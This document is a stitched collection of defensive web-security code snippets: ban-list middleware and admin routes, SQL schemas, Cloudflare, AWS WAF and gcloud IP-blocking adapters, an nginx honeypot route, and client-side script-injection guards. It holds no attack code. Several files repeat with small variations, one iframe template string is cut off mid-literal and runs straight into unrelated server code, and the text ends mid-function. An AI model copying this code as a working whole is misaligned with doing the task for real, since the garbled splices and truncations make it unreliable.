        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // log and block
          req.app.logger.warn({ event: 'ban_block', ip, apiKey, accountId, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }
      next();
    } catch (err) {
      next(err);
    }
  };
};
POST /admin/bans
Authorization: Bearer <admin-token>
Content-Type: application/json

{
  "subject_type":"ip",
  "subject_value":"203.0.113.45",
  "reason":"credential stuffing",
  "expires_at":"2026-03-07T12:00:00Z"
}
-- bans table
CREATE TABLE bans (
  id BIGSERIAL PRIMARY KEY,
  subject_type TEXT NOT NULL, -- 'ip'|'account'|'api_key'|'fingerprint'|'asn'|'tls_ja3'
  subject_value TEXT NOT NULL,
  reason TEXT,
  created_by TEXT,
  created_at TIMESTAMPTZ DEFAULT now(),
  expires_at TIMESTAMPTZ NULL,
  active BOOLEAN DEFAULT true
);
CREATE INDEX ON bans(subject_type, subject_value);

-- linked identities (to correlate multiple labels to one actor)
CREATE TABLE actor_links (
  id BIGSERIAL PRIMARY KEY,
  actor_id TEXT NOT NULL, -- opaque actor id (e.g., UUID)
  label_type TEXT NOT NULL, -- 'ip'|'fingerprint'|'api_key'|'account'|'asn'|'tls_ja3'
  label_value TEXT NOT NULL,
  seen_at TIMESTAMPTZ DEFAULT now()
);
CREATE INDEX ON actor_links(actor_id);
CREATE INDEX ON actor_links(label_type, label_value);
// ban-enforce.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client
const { pushToEdge } = require('./edge-integration'); // pluggable

async function redisGetBan(type, value) {
  const key = `ban:${type}:${value}`;
  const raw = await redis.get(key);
  return raw ? JSON.parse(raw) : null;
}

async function dbGetBan(type, value) {
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  return res.rowCount ? res.rows[0] : null;
}

async function isBanned(type, value) {
  const cached = await redisGetBan(type, value);
  if (cached) return cached;
  const ban = await dbGetBan(type, value);
  if (ban) {
    const key = `ban:${type}:${value}`;
    if (ban.expires_at) {
      const ttl = Math.max(0, Math.floor((new Date(ban.expires_at) - Date.now()) / 1000));
      await redis.setEx(key, ttl || 1, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

function extractLabels(req) {
  const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
  const ua = req.get('user-agent') || '';
  const apiKey = req.get('x-api-key') || null;
  const accountId = req.user && req.user.id ? String(req.user.id) : null;
  const asn = req.get('x-forwarded-asn') || null;
  const tlsJa3 = req.get('x-ja3') || null; // requires edge to populate
  const fingerprint = req.get('x-device-fp') || null; // optional client-sent fingerprint
  return { ip, ua, apiKey, accountId, asn, tlsJa3, fingerprint };
}

module.exports = function banMiddleware(options = {}) {
  return async function (req, res, next) {
    try {
      const labels = extractLabels(req);
      // check high-confidence labels first
      const checks = [
        isBanned('ip', labels.ip),
        labels.apiKey ? isBanned('api_key', labels.apiKey) : null,
        labels.accountId ? isBanned('account', labels.accountId) : null,
        labels.fingerprint ? isBanned('fingerprint', labels.fingerprint) : null,
        labels.asn ? isBanned('asn', labels.asn) : null,
        labels.tlsJa3 ? isBanned('tls_ja3', labels.tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // optional: push to edge for immediate network block
          if (options.edgePush && options.edgePush.enabled) {
            pushToEdge(ban.subject_type, ban.subject_value).catch(() => {});
          }
          req.app.logger?.warn({ event: 'ban_block', labels, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      // behavioral scoring: increment actor score and escalate if threshold reached
      const actorId = req.get('x-actor-id') || null; // optional precomputed actor id
      if (actorId) {
        const scoreKey = `actor:${actorId}:score`;
        const score = await redis.incr(scoreKey);
        await redis.expire(scoreKey, 3600); // sliding window
        if (score >= (options.behaviorThreshold || 100)) {
          // create a temporary ban and push to DB + Redis
          const reason = 'behavioral threshold exceeded';
          const expiresAt = new Date(Date.now() + (options.temporaryBanSeconds || 3600) * 1000);
          await db.query(
            'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5)',
            ['actor', actorId, reason, 'auto', expiresAt]
          );
          const banObj = { subject_type: 'actor', subject_value: actorId, reason, expires_at: expiresAt };
          await redis.setEx(`ban:actor:${actorId}`, Math.ceil((expiresAt - Date.now())/1000), JSON.stringify(banObj));
          if (options.edgePush && options.edgePush.enabled) {
            pushToEdge('actor', actorId).catch(()=>{});
          }
          req.app.logger?.warn({ event: 'auto_ban', actorId, score });
          return res.status(403).json({ error: 'Access denied', reason });
        }
      }

      next();
    } catch (err) {
      next(err);
    }
  };
};
// admin-bans.js (Express routes)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider
  // await pushToEdge(subject_type, subject_value);
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  // remove from redis (best-effort)
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
  }
  res.json({ ok: true });
});

module.exports = router;
// edge-integration.js (stub)
async function pushToEdge(type, value) {
  // Implement provider-specific API calls here.
  // Example: Cloudflare IP list update, AWS WAF IPSet update, or call to your CDN purge/block API.
  // Keep idempotent and rate-limited.
  return Promise.resolve();
}
module.exports = { pushToEdge };
// correlate-worker.js (concept)
const db = require('./db');
async function correlate() {
  // find labels that co-occur in short windows and assign actor ids
  // pseudocode: for each recent request log, group labels and upsert actor_links
  // then merge actor_ids that share labels and update bans if necessary
}
setInterval(correlate, 60_000);
// ban-middleware.js (Express)
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  if (res.rowCount) {
    const ban = res.rows[0];
    if (ban.expires_at) {
      const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
      await redis.setEx(key, ttl, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

module.exports = function banMiddleware(opts = {}) {
  return async function (req, res, next) {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const asn = req.get('x-forwarded-asn') || null;
      const tlsJa3 = req.get('x-ja3') || null;
      const fingerprint = req.get('x-device-fp') || null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null,
        fingerprint ? isBanned('fingerprint', fingerprint) : null,
        asn ? isBanned('asn', asn) : null,
        tlsJa3 ? isBanned('tls_ja3', tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          req.app.logger?.warn({ event: 'ban_block', ip, apiKey, accountId, fingerprint, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      // Optional behavioral scoring and auto-escalation
      const actorId = req.get('x-actor-id') || null;
      if (actorId) {
        const scoreKey = `actor:${actorId}:score`;
        const score = await redis.incr(scoreKey);
        await redis.expire(scoreKey, 3600);
        if (score >= (opts.behaviorThreshold || 100)) {
          const reason = 'behavioral threshold exceeded';
          const expiresAt = new Date(Date.now() + (opts.temporaryBanSeconds || 3600) * 1000);
          await db.query(
            'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5)',
            ['actor', actorId, reason, 'auto', expiresAt]
          );
          const banObj = { subject_type: 'actor', subject_value: actorId, reason, expires_at: expiresAt };
          await redis.setEx(`ban:actor:${actorId}`, Math.ceil((expiresAt - Date.now())/1000), JSON.stringify(banObj));
          req.app.logger?.warn({ event: 'auto_ban', actorId, score });
          return res.status(403).json({ error: 'Access denied', reason });
        }
      }

      next();
    } catch (err) {
      next(err);
    }
  };
};
// admin-bans.js (Express)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider here
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
    // optional: remove from edge provider
  }
  res.json({ ok: true });
});

module.exports = router;
// admin-bans.js (Express)
const express = require('express');
const router = express.Router();
const db = require('./db');
const redis = require('redis').createClient();

router.post('/bans', async (req, res) => {
  const { subject_type, subject_value, reason, expires_at } = req.body;
  const created_by = req.user && req.user.id ? req.user.id : 'admin';
  const q = 'INSERT INTO bans(subject_type, subject_value, reason, created_by, expires_at) VALUES($1,$2,$3,$4,$5) RETURNING *';
  const r = await db.query(q, [subject_type, subject_value, reason, created_by, expires_at || null]);
  const ban = r.rows[0];
  const key = `ban:${subject_type}:${subject_value}`;
  if (ban.expires_at) {
    const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
    await redis.setEx(key, ttl, JSON.stringify(ban));
  } else {
    await redis.set(key, JSON.stringify(ban));
  }
  // optional: push to edge provider here
  res.json(ban);
});

router.post('/bans/revoke', async (req, res) => {
  const { id } = req.body;
  await db.query('UPDATE bans SET active=false WHERE id=$1', [id]);
  const banRow = await db.query('SELECT subject_type, subject_value FROM bans WHERE id=$1', [id]);
  if (banRow.rowCount) {
    const { subject_type, subject_value } = banRow.rows[0];
    await redis.del(`ban:${subject_type}:${subject_value}`);
    // optional: remove from edge provider
  }
  res.json({ ok: true });
});

module.exports = router;
// ban-middleware.js
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value) {
  if (!value) return null;
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);
  const res = await db.query(
    'SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',
    [type, value]
  );
  if (res.rowCount) {
    const ban = res.rows[0];
    if (ban.expires_at) {
      const ttl = Math.max(1, Math.floor((new Date(ban.expires_at) - Date.now())/1000));
      await redis.setEx(key, ttl, JSON.stringify(ban));
    } else {
      await redis.set(key, JSON.stringify(ban));
    }
    return ban;
  }
  return null;
}

module.exports = function banMiddleware(opts = {}) {
  return async function (req, res, next) {
    try {
      const ip = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      const apiKey = req.get('x-api-key') || null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const fingerprint = req.get('x-device-fp') || null;
      const asn = req.get('x-forwarded-asn') || null;
      const tlsJa3 = req.get('x-ja3') || null;

      const checks = [
        isBanned('ip', ip),
        apiKey ? isBanned('api_key', apiKey) : null,
        accountId ? isBanned('account', accountId) : null,
        fingerprint ? isBanned('fingerprint', fingerprint) : null,
        asn ? isBanned('asn', asn) : null,
        tlsJa3 ? isBanned('tls_ja3', tlsJa3) : null
      ].filter(Boolean);

      for (const p of checks) {
        const ban = await p;
        if (ban) {
          // signal edge to escalate (best-effort)
          if (opts.edge && opts.edge.notify) opts.edge.notify({ type: ban.subject_type, value: ban.subject_value, reason: ban.reason });
          req.app.logger?.warn({ event: 'ban_block', ip, apiKey, accountId, fingerprint, ban });
          return res.status(403).json({ error: 'Access denied', reason: ban.reason || 'restricted' });
        }
      }

      next();
    } catch (err) { next(err); }
  };
};
// edge-adapter.js (generic)
async function pushIpBlockToEdge(providerClient, ip, meta = {}) {
  // providerClient is a pluggable SDK for Cloudflare/AWS/GCP/etc.
  // Implement idempotent upsert: create or update an IP set entry and return ruleId for revocation.
  const ruleId = await providerClient.upsertIpSet({ ip, meta });
  return ruleId;
}

async function removeIpBlockFromEdge(providerClient, ruleId) {
  await providerClient.removeIpSetEntry(ruleId);
}

module.exports = { pushIpBlockToEdge, removeIpBlockFromEdge };
map $http_x_suspicious $to_honeypot {
  default 0;
  "1" 1;
}

server {
  listen 80;
  server_name example.com;

  location / {
    proxy_pass http://app_upstream;
  }

  location /honeypot/ {
    proxy_pass http://honeypot_upstream;
  }

  # conditional routing: if app sets header X-Suspicious: 1, rewrite to honeypot
  proxy_intercept_errors on;
  error_page 418 = @to_honeypot;
}

# In app: respond with 418 and header X-Suspicious when you want the edge to divert
// correlate-worker.js (concept)
const db = require('./db');

async function correlateRecentLogs() {
  // 1) fetch recent request logs with labels (ip, fingerprint, api_key, account)
  // 2) group by co-occurrence within short time windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and mark linked labels as suspicious
  // 5) create temporary bans for linked labels if confidence threshold reached
}
setInterval(correlateRecentLogs, 60_000);
// cloudflare-adapter.js
const fetch = require('node-fetch');

class CloudflareAdapter {
  constructor({ accountId, zoneId, apiToken }) {
    this.accountId = accountId;
    this.zoneId = zoneId;
    this.apiToken = apiToken;
    this.base = 'https://api.cloudflare.com/client/v4';
  }

  headers() {
    return {
      'Authorization': `Bearer ${this.apiToken}`,
      'Content-Type': 'application/json'
    };
  }

  async upsertIpList(listName) {
    // find or create an IP list (managed by account)
    const url = `${this.base}/accounts/${this.accountId}/rules/lists`;
    const res = await fetch(`${url}?name=${encodeURIComponent(listName)}`, { headers: this.headers() });
    const j = await res.json();
    if (j.result && j.result.length) return j.result[0];
    const create = await fetch(url, {
      method: 'POST',
      headers: this.headers(),
      body: JSON.stringify({ name: listName, kind: 'ip', description: 'Managed by system' })
    });
    return (await create.json()).result;
  }

  async addIpToList(listId, ip) {
    const url = `${this.base}/accounts/${this.accountId}/rules/lists/${listId}/items`;
    // idempotent: check existing items first
    const existing = await fetch(url, { headers: this.headers() }).then(r => r.json());
    if (existing.result && existing.result.some(i => i.ip === ip)) return existing.result.find(i => i.ip === ip);
    const res = await fetch(url, {
      method: 'POST',
      headers: this.headers(),
      body: JSON.stringify([{ ip, comment: 'auto-block' }])
    });
    return (await res.json()).result[0];
  }

  async upsertFirewallRule(ruleName, listId, action = 'block') {
    // get existing rules
    const url = `${this.base}/zones/${this.zoneId}/firewall/rules`;
    const rules = await fetch(url, { headers: this.headers() }).then(r => r.json());
    const match = (rules.result || []).find(r => r.description === ruleName);
    const expression = `ip.src in $${listId}`; // Cloudflare uses lists by id reference in expressions
    const payload = { action, description: ruleName, filter: { expression } };
    if (match) {
      // update
      const res = await fetch(`${url}/${match.id}`, {
        method: 'PUT', headers: this.headers(), body: JSON.stringify(payload)
      });
      return (await res.json()).result;
    } else {
      // create
      const res = await fetch(url, {
        method: 'POST', headers: this.headers(), body: JSON.stringify([payload])
      });
      return (await res.json()).result[0];
    }
  }

  async removeIpFromList(listId, listItemId) {
    const url = `${this.base}/accounts/${this.accountId}/rules/lists/${listId}/items/${listItemId}`;
    await fetch(url, { method: 'DELETE', headers: this.headers() });
  }

  async deleteFirewallRule(ruleId) {
    const url = `${this.base}/zones/${this.zoneId}/firewall/rules/${ruleId}`;
    await fetch(url, { method: 'DELETE', headers: this.headers() });
  }
}

module.exports = CloudflareAdapter;
// aws-waf-adapter.js
const { WAFV2Client, GetIPSetCommand, CreateIPSetCommand, UpdateIPSetCommand, ListIPSetsCommand } = require('@aws-sdk/client-wafv2');

class AwsWafAdapter {
  constructor({ region, scope = 'REGIONAL' }) {
    this.client = new WAFV2Client({ region });
    this.scope = scope; // 'REGIONAL' or 'CLOUDFRONT'
  }

  async findOrCreateIpSet(name, description = '') {
    const list = await this.client.send(new ListIPSetsCommand({ Scope: this.scope }));
    const found = (list.IPSets || []).find(i => i.Name === name);
    if (found) return found;
    const res = await this.client.send(new CreateIPSetCommand({
      Name: name, Scope: this.scope, Description: description, IPAddressVersion: 'IPV4', Addresses: []
    }));
    return { Name: name, Id: res.Summary.Id, ARN: res.Summary.ARN };
  }

  async addIpToIpSet(ipSetId, addresses, lockToken) {
    // get current set, update with new addresses (idempotent)
    const get = await this.client.send(new GetIPSetCommand({ Name: ipSetId.Name, Scope: this.scope, Id: ipSetId.Id }));
    const current = new Set(get.IPSet.Addresses || []);
    addresses.forEach(a => current.add(a));
    const res = await this.client.send(new UpdateIPSetCommand({
      Name: ipSetId.Name, Scope: this.scope, Id: ipSetId.Id, Addresses: Array.from(current), LockToken: get.LockToken
    }));
    return res;
  }

  // Note: associating IPSet with WebACL requires WebACL update; implement in your deployment pipeline.
}

module.exports = AwsWafAdapter;
# create a rule to deny an IP (gcloud)
PROJECT=my-project
POLICY=my-security-policy
IP=203.0.113.45

# add a deny rule with a priority (lower number = higher priority)
gcloud compute security-policies rules create 1000 \
  --security-policy=${POLICY} \
  --expression="inIpRange(origin.ip, '${IP}')" \
  --action=deny-403 \
  --description="auto-block for malicious actor"
# remove the rule by priority
gcloud compute security-policies rules delete 1000 --security-policy=${POLICY}
/* ===== Trusted Types policy to block unsafe sinks ===== */
  if (window.trustedTypes) {
    try {
      window.trustedTypes.createPolicy('guardPolicy', {
        createHTML: () => { throw new Error('createHTML blocked'); },
        createScript: () => { throw new Error('createScript blocked'); },
        createScriptURL: () => { throw new Error('createScriptURL blocked'); }
      });
    } catch (e) { console.warn('TrustedTypes policy not created or already exists'); }
  }

  /* ===== Allowlist: module URL -> expected sha256-base64 (populate from CI in production) ===== */
  const ALLOWED_MODULES = {
    '/modules/approved-widget.js': 'sha256-REPLACE_WITH_BASE64_HASH'
  };

  /* ===== Logging helper ===== */
  function log(msg) {
    const el = document.getElementById('log');
    const t = new Date().toISOString();
    el.textContent = `[${t}] ${msg}\n` + el.textContent;
    console.log(msg);
  }

  /* ===== Compute SHA-256 base64 of ArrayBuffer ===== */
  async function sha256Base64(buffer) {
    const hash = await crypto.subtle.digest('SHA-256', buffer);
    const bytes = new Uint8Array(hash);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  }

  /* ===== Safe dynamic module loader: fetch -> verify -> execute ===== */
  async function loadModuleSafely(url) {
    try {
      if (!ALLOWED_MODULES[url]) throw new Error('Not allowlisted');
      const resp = await fetch(url, { credentials: 'same-origin' });
      if (!resp.ok) throw new Error('Fetch failed: ' + resp.status);
      const buf = await resp.arrayBuffer();
      const base64 = await sha256Base64(buf);
      const computed = 'sha256-' + base64;
      if (computed !== ALLOWED_MODULES[url]) throw new Error('Integrity mismatch');
      const blob = new Blob([buf], { type: 'application/javascript' });
      const blobUrl = URL.createObjectURL(blob);
      const s = document.createElement('script');
      s.type = 'module';
      s.src = blobUrl;
      s.onload = () => { URL.revokeObjectURL(blobUrl); log('Module loaded: ' + url); };
      s.onerror = (e) => { URL.revokeObjectURL(blobUrl); log('Module execution failed: ' + e); };
      document.head.appendChild(s);
    } catch (err) {
      log('Blocked module load: ' + err.message);
      document.getElementById('status').textContent = 'Blocked: ' + err.message;
    }
  }

  /* ===== MutationObserver: remove unauthorized scripts/links immediately ===== */
  const ALLOWED_SCRIPT_SRCS = new Set([
    location.origin + '/app.bundle.js',
    'https://trusted.cdn.example/lib.js'
  ]);

  function nodeAllowed(node) {
    if (node.tagName === 'SCRIPT' && node.src) return ALLOWED_SCRIPT_SRCS.has(node.src);
    if (node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) return node.href.startsWith(location.origin);
    return true;
  }

  const observer = new MutationObserver(muts => {
    for (const m of muts) {
      for (const n of m.addedNodes) {
        if (n.nodeType !== 1) continue;
        if ((n.tagName === 'SCRIPT' || n.tagName === 'LINK') && !nodeAllowed(n)) {
          log('Removed unauthorized node: ' + (n.src || n.href || n.outerHTML.slice(0,80)));
          n.remove();
        }
      }
    }
  });

  observer.observe(document.documentElement, { childList: true, subtree: true });

  /* ===== Sandbox untrusted code in iframe and validate messages ===== */
  const sandbox = document.createElement('iframe');
  sandbox.sandbox = 'allow-scripts';
  sandbox.style.display = 'none';
  sandbox.srcdoc = `<script>window.addEventListener('message', e=>{ if(e.data && e.data.cmd==='ping') parent.postMessage({cmd:'pong',nonce:e.data.nonce}, '*'); });/* Trusted Types policy */
if (window.trustedTypes) {
  try { window.trustedTypes.createPolicy('guard', { createHTML:()=>{throw new Error('blocked')}, createScript:()=>{throw new Error('blocked')} }); }
  catch(e){ console.warn('TrustedTypes not created'); }
}

/* Allowlist: URL -> 'sha256-BASE64' (populate from CI in production) */
const ALLOWED = { '/modules/widget-v1.js': 'sha256-REPLACE_BASE64' };

/* Logging helper */
function log(msg){ const p=document.getElementById('log'); p.textContent = new Date().toISOString() + ' ' + msg + '\n' + p.textContent; console.log(msg); }

/* Compute SHA-256 base64 */
async function sha256Base64(buf){
  const h = await crypto.subtle.digest('SHA-256', buf);
  const b = String.fromCharCode(...new Uint8Array(h));
  return btoa(b);
}

/* Safe module loader: fetch -> verify -> execute as module */
async function loadModuleSafely(url){
  try{
    if(!ALLOWED[url]) throw new Error('not allowlisted');
    const r = await fetch(url, {credentials:'same-origin'});
    if(!r.ok) throw new Error('fetch failed');
    const buf = await r.arrayBuffer();
    const base64 = await sha256Base64(buf);
    if('sha256-'+base64 !== ALLOWED[url]) throw new Error('integrity mismatch');
    const blob = new Blob([buf], {type:'application/javascript'});
    const blobUrl = URL.createObjectURL(blob);
    const s = document.createElement('script'); s.type='module'; s.src = blobUrl;
    s.onload = ()=>{ URL.revokeObjectURL(blobUrl); log('module loaded: '+url); };
    s.onerror = (e)=>{ URL.revokeObjectURL(blobUrl); log('module execution failed'); };
    document.head.appendChild(s);
  }catch(e){ log('blocked module: '+e.message); reportEvent({type:'module_block', url, reason:e.message}); }
}

/* MutationObserver: remove unauthorized scripts/links */
const ALLOWED_SCRIPT_SRCS = new Set([location.origin + '/app.bundle.js']);
const observer = new MutationObserver(muts=>{
  for(const m of muts) for(const n of m.addedNodes){
    if(n.nodeType!==1) continue;
    if((n.tagName==='SCRIPT' && n.src && !ALLOWED_SCRIPT_SRCS.has(n.src)) || (n.tagName==='LINK' && n.rel==='stylesheet' && n.href && !n.href.startsWith(location.origin))){
      log('removed unauthorized node: ' + (n.src||n.href||n.outerHTML.slice(0,80)));
      n.remove();
      reportEvent({type:'injection_removed', node: n.src||n.href||n.tagName});
    }
  }
});
observer.observe(document.documentElement, {childList:true, subtree:true});

/* Sandbox iframe for untrusted code */
const iframe = document.createElement('iframe'); iframe.sandbox='allow-scripts'; iframe.style.display='none';
iframe.srcdoc = `<script>window.addEventListener('message',e=>{ if(e.data&&e.data.cmd==='ping') parent.postMessage({cmd:'pong',nonce:e.data.nonce}, '*'); });
// ban-middleware.js (Express)
const redis = require('redis').createClient();
const db = require('./db'); // pg client

async function isBanned(type, value){
  if(!value) return null;
  const key = `ban:${type}:${value}`;
  const cached = await redis.get(key);
  if(cached) return JSON.parse(cached);
  const res = await db.query('SELECT * FROM bans WHERE subject_type=$1 AND subject_value=$2 AND active=true LIMIT 1',[type,value]);
  if(res.rowCount){ const ban=res.rows[0]; if(ban.expires_at){ const ttl=Math.max(1,Math.floor((new Date(ban.expires_at)-Date.now())/1000)); await redis.setEx(key,ttl,JSON.stringify(ban)); } else await redis.set(key,JSON.stringify(ban)); return ban; }
  return null;
}

module.exports = function banMiddleware(){
  return async (req,res,next)=>{
    try{
      const ip = (req.headers['x-forwarded-for']||req.ip||'').split(',')[0].trim();
      const apiKey = req.get('x-api-key')||null;
      const accountId = req.user && req.user.id ? String(req.user.id) : null;
      const fingerprint = req.get('x-device-fp')||null;
      const checks = [ isBanned('ip',ip), apiKey?isBanned('api_key',apiKey):null, accountId?isBanned('account',accountId):null, fingerprint?isBanned('fingerprint',fingerprint):null ].filter(Boolean);
      for(const p of checks){ const ban = await p; if(ban){ req.app.logger?.warn({event:'ban_block', ip, apiKey, accountId, fingerprint, ban}); return res.status(403).json({error:'Access denied', reason:ban.reason||'restricted'}); } }
      next();
    }catch(err){ next(err); }
  };
};
// admin-modules.js (Express routes)
const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const db = require('./db'); // your DB client

// Delete module file and record audit
router.post('/admin/modules/delete', async (req, res) => {
  const { modulePath, adminId, reason } = req.body;
  if (!adminId || !modulePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', modulePath);
  try {
    // audit record
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'delete_requested', adminId, reason || null]);
    // remove file (or move to quarantine)
    const quarantine = '/var/quarantine/modules';
    fs.mkdirSync(quarantine, { recursive: true });
    const dest = path.join(quarantine, path.basename(modulePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'moved_to_quarantine', adminId, reason || null]);
    // invalidate caches / CDN purge (call provider API here)
    res.json({ ok: true, quarantined: dest });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'failed' });
  }
});

module.exports = router;
# fail if any file in /dist/modules is not in allowlist.txt
for f in dist/modules/*.js; do basename "$f" | grep -Fxq "$(basename "$f")" allowlist.txt || { echo "Unknown module $f"; exit 1; }; done
// loadModuleSafely.js (client)
const ALLOWED_MODULES = { '/modules/widget-v1.js': 'sha256-BASE64HASH' };

async function sha256Base64(buf){
  const h = await crypto.subtle.digest('SHA-256', buf);
  return btoa(String.fromCharCode(...new Uint8Array(h)));
}

async function loadModuleSafely(url){
  if(!ALLOWED_MODULES[url]) throw new Error('Not allowlisted');
  const r = await fetch(url, { credentials:'same-origin' });
  if(!r.ok) throw new Error('Fetch failed');
  const buf = await r.arrayBuffer();
  const base64 = await sha256Base64(buf);
  if('sha256-'+base64 !== ALLOWED_MODULES[url]) throw new Error('Integrity mismatch');
  const blob = new Blob([buf], { type:'application/javascript' });
  const blobUrl = URL.createObjectURL(blob);
  const s = document.createElement('script'); s.type='module'; s.src = blobUrl;
  s.onload = () => URL.revokeObjectURL(blobUrl);
  document.head.appendChild(s);
}
// admin-modules.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // pg client

router.post('/admin/modules/quarantine', async (req, res) => {
  const { modulePath, adminId, reason } = req.body;
  if(!adminId || !modulePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', modulePath);
  try {
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'quarantine_requested', adminId, reason || null]);
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive:true });
    const dest = path.join(quarantineDir, path.basename(modulePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'moved_to_quarantine', adminId, reason || null]);
    // TODO: call CDN purge API here
    res.json({ ok:true, quarantined: dest });
  } catch(err){
    console.error(err);
    res.status(500).json({ error:'failed' });
  }
});

module.exports = router;

// correlate-worker.js (concept)
const db = require('./db');

async function correlate() {
  // 1) fetch recent request logs with labels
  // 2) group labels seen together within short windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and mark linked labels as suspicious
  // 5) create temporary bans for linked labels if confidence threshold reached (with audit)
}
setInterval(correlate, 60_000);
// JS: listen for animationstart to detect and remove injected nodes quickly
document.addEventListener('animationstart', (e) => {
  if (e.animationName === 'nodeInserted') {
    const node = e.target;
    // optional: log or report before removal
    console.warn('Removed injected node', node);
    node.remove();
    // send a beacon to server for forensics
    navigator.sendBeacon('/_internal/log-tamper', JSON.stringify({ event: 'injection_removed', tag: node.tagName, html: node.outerHTML.slice(0,200) }));
  }
}, true);
(function(){
  const LOG_ENDPOINT = '/_internal/log-tamper'; // secure server endpoint
  const ALLOWED_SCRIPT_ORIGINS = [location.origin, 'https://trusted.cdn.example'];
  const CANONICAL_STYLE_ID = 'canonical-style';

